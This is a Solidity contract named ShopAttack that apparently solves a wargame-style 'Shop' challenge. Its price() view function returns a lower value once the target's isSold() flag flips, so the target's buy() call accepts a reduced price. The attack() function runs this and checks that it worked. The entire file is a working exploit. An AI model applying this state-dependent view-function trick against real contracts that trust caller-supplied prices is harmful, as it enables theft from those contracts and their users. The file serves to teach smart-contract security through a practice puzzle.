// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IShop.sol";

contract ShopAttack {
    IShop private immutable target;

    constructor(IShop target_) {
        target = target_;
    }

    function attack() external {
        uint256 price_ = target.price();

        target.buy();

        require(target.isSold() && price_ > target.price(), "Shop: Attack failed");
    }

    function price() external view returns (uint256) {
        return target.price() - (target.isSold() ? 1 : 0);
    }
}
